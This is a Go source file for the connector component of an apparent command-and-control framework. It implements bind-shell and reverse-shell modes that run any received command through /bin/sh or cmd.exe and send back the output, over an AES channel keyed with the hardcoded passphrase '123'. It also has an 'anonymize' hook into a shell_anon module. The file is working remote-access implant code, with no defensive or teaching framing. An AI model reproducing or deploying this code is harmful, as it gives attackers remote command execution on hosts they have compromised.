package connector

import (
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"os/exec"
	"runtime"
	"strings"
	"sync"

	"github.com/simplified_c2/core/crypto" // For AES encryption
	"github.com/simplified_c2/module"      // For module system
	"github.com/simplified_c2/modules/shell_anon"
)

// Protocol represents the network protocol to use
type Protocol int

const (
	TCP Protocol = iota
	UDP
	HTTP
	HTTPS
	DNS
)

// ConnectorType represents the type of connector
type ConnectorType int

const (
	BindShell ConnectorType = iota
	ReverseShell
)

// SecurityConfig interface for security features
type SecurityConfig interface {
	SecureNetwork(conn io.ReadWriter) io.ReadWriter
}

// ConnectorConfig holds configuration for the connector
type ConnectorConfig struct {
	Type           ConnectorType
	Protocol       Protocol
	Host           string
	Port           int
	Secure         bool
	SecurityConfig SecurityConfig
}

// Protocol constants for secure_shell compatibility
const (
	PROTOCOL_VERSION = 1
	MSG_HANDSHAKE    = 1
	MSG_COMMAND      = 2
	MSG_RESPONSE     = 3
	MSG_ERROR        = 255
	HANDSHAKE_OK     = 0
)

// MessageHeader defines the secure_shell message header
type MessageHeader struct {
	Version    byte
	Type       byte
	PayloadLen uint32
}

// Connector represents a C2 connector
type Connector struct {
	config       *ConnectorConfig
	listener     net.Listener
	connection   net.Conn
	mutex        sync.Mutex
	moduleSystem *module.ModuleSystem // Added for module integration
	passphrase   []byte               // Passphrase for AES encryption
}

// NewConnector creates a new connector
func NewConnector(config *ConnectorConfig) *Connector {
	// Initialize module system and register shell_anon
	moduleSystem := module.NewModuleSystem()
	shellAnonModule := shell_anon.NewModule()
	moduleSystem.Registry.RegisterModule("shell_anon", func() module.ModuleInterface {
		return shellAnonModule
	})

	return &Connector{
		config:       config,
		moduleSystem: moduleSystem,
		passphrase:   []byte("123"), // Must match secure_shell passphrase
	}
}

// Start starts the connector
func (c *Connector) Start() error {
	switch c.config.Type {
	case BindShell:
		return c.startServer()
	case ReverseShell:
		return c.startClient()
	default:
		return fmt.Errorf("unsupported connector type: %v", c.config.Type)
	}
}

// Stop stops the connector
func (c *Connector) Stop() error {
	c.mutex.Lock()
	defer c.mutex.Unlock()

	if c.listener != nil {
		if err := c.listener.Close(); err != nil {
			return fmt.Errorf("failed to close listener: %v", err)
		}
		c.listener = nil
	}

	if c.connection != nil {
		if err := c.connection.Close(); err != nil {
			return fmt.Errorf("failed to close connection: %v", err)
		}
		c.connection = nil
	}

	return nil
}

// startServer starts a bind shell server
func (c *Connector) startServer() error {
	addr := fmt.Sprintf("%s:%d", c.config.Host, c.config.Port)
	var err error
	c.listener, err = net.Listen("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to listen on %s: %v", addr, err)
	}
	fmt.Printf("C2 server listening on %s\n", addr)

	go func() {
		for {
			conn, err := c.listener.Accept()
			if err != nil {
				if strings.Contains(err.Error(), "use of closed network connection") {
					return
				}
				fmt.Printf("Error accepting connection: %v\n", err)
				continue
			}

			// Secure the connection if needed (TLS)
			if c.config.Secure && c.config.SecurityConfig != nil {
				conn = c.wrapConnection(conn)
			}

			c.mutex.Lock()
			c.connection = conn
			c.mutex.Unlock()

			go c.handleConnection(conn)
		}
	}()

	return nil
}

// startClient starts a reverse shell client
func (c *Connector) startClient() error {
	addr := fmt.Sprintf("%s:%d", c.config.Host, c.config.Port)
	var err error
	c.connection, err = net.Dial("tcp", addr)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %v", addr, err)
	}

	if c.config.Secure && c.config.SecurityConfig != nil {
		c.connection = c.wrapConnection(c.connection)
	}

	go c.handleConnection(c.connection)

	return nil
}

// handleConnection handles a connection using secure_shell protocol
func (c *Connector) handleConnection(conn net.Conn) {
	defer conn.Close()

	// Perform handshake
	if err := c.performHandshake(conn); err != nil {
		fmt.Printf("Handshake failed: %v\n", err)
		return
	}

	// Handle commands
	for {
		msgType, payload, err := c.receiveMessage(conn)
		if err != nil {
			if err != io.EOF {
				fmt.Printf("Error receiving message: %v\n", err)
			}
			return
		}

		if msgType != MSG_COMMAND {
			c.sendMessage(conn, MSG_ERROR, []byte("expected command"))
			continue
		}

		command := string(payload)
		var response string

		if command == "exit" {
			fmt.Println("Received exit command")
			return
		}

		if command == "anonymize" {
			// Execute shell_anon module's setup command
			shellAnonModule, err := c.moduleSystem.Manager.LoadModule("shell_anon")
			if err != nil {
				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("failed to load shell_anon: %v", err)))
				continue
			}
			result, err := shellAnonModule.ExecuteCommand("setup", []string{})
			if err != nil {
				c.sendMessage(conn, MSG_ERROR, []byte(fmt.Sprintf("anonymize failed: %v", err)))
				continue
			}
			response = fmt.Sprintf("Anonymization applied: %v", result)
		} else {
			// Execute shell command
			output, err := c.ExecuteCommand(command)
			if err != nil {
				response = fmt.Sprintf("Error: %v\n%s", err, output)
			} else {
				response = output
			}
		}

		c.sendMessage(conn, MSG_RESPONSE, []byte(response))
	}
}

// performHandshake handles the secure_shell handshake
func (c *Connector) performHandshake(conn net.Conn) error {
	// Receive handshake message
	msgType, payload, err := c.receiveMessage(conn)
	if err != nil {
		return fmt.Errorf("failed to receive handshake: %v", err)
	}
	if msgType != MSG_HANDSHAKE {
		c.sendMessage(conn, MSG_ERROR, []byte("expected handshake"))
		return fmt.Errorf("unexpected message type: %d", msgType)
	}

	// Simplified handshake: echo back challenge with HANDSHAKE_OK
	response := append([]byte{HANDSHAKE_OK}, payload...)
	return c.sendMessage(conn, MSG_HANDSHAKE, response)
}

// sendMessage sends a secure_shell message
func (c *Connector) sendMessage(conn net.Conn, msgType byte, payload []byte) error {
	encryptedPayload, err := crypto.AESEncrypt(payload, c.passphrase)
	if err != nil {
		return fmt.Errorf("encryption failed: %v", err)
	}

	header := MessageHeader{
		Version:    PROTOCOL_VERSION,
		Type:       msgType,
		PayloadLen: uint32(len(encryptedPayload)),
	}

	if err := binary.Write(conn, binary.BigEndian, header.Version); err != nil {
		return err
	}
	if err := binary.Write(conn, binary.BigEndian, header.Type); err != nil {
		return err
	}
	if err := binary.Write(conn, binary.BigEndian, header.PayloadLen); err != nil {
		return err
	}
	_, err = conn.Write(encryptedPayload)
	return err
}

// receiveMessage receives a secure_shell message
func (c *Connector) receiveMessage(conn net.Conn) (byte, []byte, error) {
	var header MessageHeader
	if err := binary.Read(conn, binary.BigEndian, &header.Version); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(conn, binary.BigEndian, &header.Type); err != nil {
		return 0, nil, err
	}
	if err := binary.Read(conn, binary.BigEndian, &header.PayloadLen); err != nil {
		return 0, nil, err
	}

	if header.Version != PROTOCOL_VERSION {
		return 0, nil, fmt.Errorf("unsupported protocol version: %d", header.Version)
	}

	encryptedPayload := make([]byte, header.PayloadLen)
	if _, err := io.ReadFull(conn, encryptedPayload); err != nil {
		return 0, nil, err
	}

	payload, err := crypto.AESDecrypt(encryptedPayload, c.passphrase)
	if err != nil {
		return 0, nil, fmt.Errorf("decryption failed: %v", err)
	}

	return header.Type, payload, nil
}

// wrapConnection wraps a connection with security
func (c *Connector) wrapConnection(conn net.Conn) net.Conn {
	if c.config.SecurityConfig != nil {
		securedConn := c.config.SecurityConfig.SecureNetwork(conn)
		if securedConn != nil {
			return conn // Simplified; implement proper net.Conn wrapper if needed
		}
	}
	return conn
}

// SendCommand sends a command to the remote system
func (c *Connector) SendCommand(command string) (string, error) {
	c.mutex.Lock()
	conn := c.connection
	c.mutex.Unlock()

	if conn == nil {
		return "", errors.New("no active connection")
	}

	// Send command as secure_shell message
	err := c.sendMessage(conn, MSG_COMMAND, []byte(command))
	if err != nil {
		return "", fmt.Errorf("failed to send command: %v", err)
	}

	// Receive response
	msgType, payload, err := c.receiveMessage(conn)
	if err != nil {
		return "", fmt.Errorf("failed to read response: %v", err)
	}

	if msgType == MSG_ERROR {
		return "", fmt.Errorf("server error: %s", string(payload))
	}
	if msgType != MSG_RESPONSE {
		return "", fmt.Errorf("unexpected message type: %d", msgType)
	}

	return string(payload), nil
}

// ExecuteCommand executes a command on the local system
func (c *Connector) ExecuteCommand(command string) (string, error) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/C", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		return string(output), fmt.Errorf("command execution failed: %v", err)
	}

	return string(output), nil
}
